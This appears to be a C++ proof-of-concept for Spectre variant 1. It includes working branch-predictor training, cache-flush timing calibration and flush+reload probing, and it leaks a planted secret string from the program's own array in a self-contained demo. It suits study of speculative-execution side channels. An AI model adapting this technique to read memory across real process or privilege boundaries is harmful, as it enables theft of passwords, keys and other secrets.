#include "spectre_v1.hpp"

#include "statistics.hpp"
#include "timer.hpp"

#include <algorithm>
#include <array>
#include <cstddef>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <string>
#include <vector>

namespace {

// This is deliberately a self-contained toy victim. It never reads an
// arbitrary address supplied by the caller.
constexpr std::size_t kArchitecturalArraySize = 16;
constexpr std::size_t kArrayStorage = 160;
constexpr std::size_t kProbeStride = 4096;
constexpr int kProbeValues = 256;
constexpr int kCalibrationSamples = 1000;
constexpr int kTrainingIterations = 30;
constexpr int kTrainingEvery = 6;
constexpr int kSpeculationDelay = 100;

alignas(64) std::array<std::uint8_t, kArrayStorage> array1{};
alignas(4096) std::array<std::uint8_t,
                           kProbeValues * kProbeStride> array2{};

// Keep the bound in writable memory so the compiler cannot constant-fold it
// into a branch with no dynamic bounds value.
alignas(64) volatile std::size_t array1_size =
    kArchitecturalArraySize;

volatile std::uint8_t temp = 0;

constexpr char kSecret[] =
    "The Magic Words are Squeamish Ossifrage.";

struct CandidateScores {
    std::array<int, kProbeValues> score{};
};

std::uint64_t calibrate_threshold() {
    std::vector<std::uint64_t> hits;
    std::vector<std::uint64_t> misses;
    hits.reserve(kCalibrationSamples);
    misses.reserve(kCalibrationSamples);

    volatile std::uint8_t* probe = &array2[0];

    for (int i = 0; i < kCalibrationSamples; ++i) {
        temp ^= *probe;

        const std::uint64_t hit_start = Timer::read_tsc_start();
        temp ^= *probe;
        const std::uint64_t hit_end = Timer::read_tsc_end();
        hits.push_back(hit_end - hit_start);

        Timer::clflush(probe);
        Timer::clflush_fence();

        const std::uint64_t miss_start = Timer::read_tsc_start();
        temp ^= *probe;
        const std::uint64_t miss_end = Timer::read_tsc_end();
        misses.push_back(miss_end - miss_start);
    }

    const auto hit = Statistics::summarize(hits);
    const auto miss = Statistics::summarize(misses);

    const auto hit_p99 =
        static_cast<std::uint64_t>(hit.p99);
    const auto miss_median =
        static_cast<std::uint64_t>(miss.median);

    if (miss_median > hit_p99 + 10) {
        return (hit_p99 + miss_median) / 2;
    }

    return hit_p99 + 20;
}

#if defined(__GNUC__) || defined(__clang__)
__attribute__((noinline))
#endif
void victim_function(std::size_t x) {
    if (x < array1_size) {
        const std::size_t value =
            static_cast<std::size_t>(array1[x]);

        temp &= array2[value * kProbeStride];
    }
}

void train_and_attack(std::size_t malicious_x,
                      int attempt) {
    const std::size_t training_x =
        static_cast<std::size_t>(attempt) %
        kArchitecturalArraySize;

    for (int j = 0; j < kTrainingIterations; ++j) {
        Timer::clflush(&array1_size);
        Timer::clflush_fence();

        for (volatile int z = 0; z < kSpeculationDelay; ++z) {
        }

        const bool attack_slot =
            (j % kTrainingEvery) ==
            (kTrainingEvery - 1);

        const std::size_t x =
            attack_slot ? malicious_x : training_x;

        victim_function(x);
    }
}

void score_reload(CandidateScores& scores,
                  std::uint64_t threshold) {
    for (int i = 0; i < kProbeValues; ++i) {
        const int mixed =
            ((i * 167) + 13) & 255;

        volatile std::uint8_t* address =
            &array2[static_cast<std::size_t>(mixed) * kProbeStride];

        const std::uint64_t t0 =
            Timer::read_tsc_start();
        temp ^= *address;
        const std::uint64_t t1 =
            Timer::read_tsc_end();

        if (t1 - t0 <= threshold) {
            ++scores.score[static_cast<std::size_t>(mixed)];
        }
    }
}

SpectreResult analyze_scores(
    const CandidateScores& scores,
    std::uint64_t threshold,
    int attempts) {
    int best = 0;
    int second = 0;

    for (int i = 1; i < kProbeValues; ++i) {
        const int value =
            scores.score[static_cast<std::size_t>(i)];

        if (value > scores.score[
                static_cast<std::size_t>(best)]) {
            second = best;
            best = i;
        } else if (i != best &&
                   value > scores.score[
                       static_cast<std::size_t>(second)]) {
            second = i;
        }
    }

    const int best_score =
        scores.score[static_cast<std::size_t>(best)];
    const int second_score =
        scores.score[static_cast<std::size_t>(second)];

    const int gap =
        best_score - second_score;

    const double confidence =
        attempts > 0
            ? std::max(
                0.0,
                static_cast<double>(gap) /
                static_cast<double>(attempts))
            : 0.0;

    SpectreResult result;
    result.guessed_value =
        static_cast<std::uint8_t>(best);
    result.score = best_score;
    result.second_score = second_score;
    result.threshold_cycles = threshold;
    result.confidence = confidence;
    result.attempts = attempts;

    const bool separated =
        best_score >= (2 * second_score + 5);

    const bool enough_evidence =
        best_score >= std::max(5, attempts / 40);

    result.success =
        separated && enough_evidence;

    return result;
}

SpectreResult read_byte_with_threshold(
    std::size_t malicious_x,
    int tries,
    std::uint64_t threshold) {
    CandidateScores scores;

    for (int attempt = 0; attempt < tries; ++attempt) {
        for (int i = 0; i < kProbeValues; ++i) {
            Timer::clflush(
                &array2[
                    static_cast<std::size_t>(i) *
                    kProbeStride]);
        }
        Timer::clflush_fence();

        train_and_attack(
            malicious_x,
            attempt);

        score_reload(scores, threshold);
    }

    return analyze_scores(
        scores,
        threshold,
        tries);
}

SpectreResult retry_if_uncertain(
    std::size_t malicious_x,
    int tries,
    std::uint64_t threshold) {
    SpectreResult first =
        read_byte_with_threshold(
            malicious_x,
            tries,
            threshold);

    if (first.success) {
        return first;
    }

    const int retry_tries =
        std::min(tries * 3, 5000);

    SpectreResult second =
        read_byte_with_threshold(
            malicious_x,
            retry_tries,
            threshold);

    return second.score > first.score
        ? second
        : first;
}

} // namespace

SpectreResult SpectreV1::read_byte(
    std::size_t malicious_x,
    int tries) {
    if (tries <= 0 ||
        malicious_x < kArchitecturalArraySize ||
        malicious_x >= kArrayStorage) {
        return {};
    }

    return retry_if_uncertain(
        malicious_x,
        tries,
        calibrate_threshold());
}

std::string SpectreV1::read_string(
    std::size_t start_offset,
    std::size_t length,
    int tries) {
    if (tries <= 0 ||
        start_offset < kArchitecturalArraySize ||
        start_offset > array1.size() ||
        length > array1.size() - start_offset) {
        return {};
    }

    const std::uint64_t threshold =
        calibrate_threshold();

    std::string result;
    result.reserve(length);

    for (std::size_t i = 0; i < length; ++i) {
        const SpectreResult value =
            retry_if_uncertain(
                start_offset + i,
                tries,
                threshold);

        result.push_back(
            value.success
                ? static_cast<char>(value.guessed_value)
                : '?');

        std::cout
            << "byte[" << i << "] = 0x"
            << std::hex
            << static_cast<int>(value.guessed_value)
            << std::dec
            << " score=" << value.score
            << " second=" << value.second_score
            << " confidence=" << value.confidence
            << (value.success
                    ? " OK"
                    : " uncertain")
            << '\n';
    }

    return result;
}

void SpectreV1::run_demo(int tries) {
    if (tries <= 0) {
        std::cerr
            << "Spectre tries must be positive.\n";
        return;
    }

    for (std::size_t i = 0;
         i < kArchitecturalArraySize;
         ++i) {
        array1[i] =
            static_cast<std::uint8_t>((i + 1) & 0xFFU);
    }

    std::memcpy(
        array1.data() + kArchitecturalArraySize,
        kSecret,
        sizeof(kSecret));

    for (int i = 0; i < kProbeValues; ++i) {
        temp ^= array2[
            static_cast<std::size_t>(i) *
            kProbeStride];
    }

    for (int i = 0; i < kProbeValues; ++i) {
        Timer::clflush(
            &array2[
                static_cast<std::size_t>(i) *
                kProbeStride]);
    }
    Timer::clflush_fence();

    const std::size_t secret_offset =
        kArchitecturalArraySize;
    const std::size_t secret_length =
        sizeof(kSecret) - 1;

    std::cout
        << "Spectre V1 self-contained demo\n"
        << "tries/byte: " << tries << '\n'
        << "secret length: " << secret_length << "\n\n";

    const std::string leaked =
        read_string(
            secret_offset,
            secret_length,
            tries);

    std::cout
        << "\n========== Spectre V1 Demo ==========\n"
        << "Leaked  : \"" << leaked << "\"\n"
        << "Original: \"" << kSecret << "\"\n"
        << "Match   : "
        << (leaked == kSecret ? "YES" : "NO")
        << '\n'
        << "=====================================\n";
}
